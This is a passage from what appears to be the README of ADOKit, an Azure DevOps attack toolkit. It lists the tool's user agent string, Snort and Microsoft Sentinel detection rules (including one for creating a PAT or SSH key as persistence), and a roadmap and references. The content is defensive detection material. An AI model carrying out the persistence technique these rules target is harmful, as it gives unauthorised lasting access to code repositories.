* User Agent String - `ADOKit-21e233d4334f9703d1a3a42b6e2efd38`
  * See [ADOKit Snort Rule](Detections/ADOKit.rules) in this repo.
* [Microsoft Sentinel Rules](Detections/Sentinel-Rules)
  * `ADOKitUsage.json` - Detects the usage of ADOKit with any auditable event (e.g., adding a user to a group)
  * `PersistenceTechniqueWithADOKit.json` - Detects the creation of a PAT or SSH key with ADOKit

For detection guidance of the techniques used by the tool, see the X-Force Red [whitepaper](https://www.ibm.com/downloads/cas/5JKAPVYD).

## Roadmap

* Support for Azure DevOps Server 


## References
* `https://learn.microsoft.com/en-us/rest/api/azure/devops/?view=azure-devops-rest-7.1`
* `https://learn.microsoft.com/en-us/azure/devops/user-guide/what-is-azure-devops?view=azure-devops`
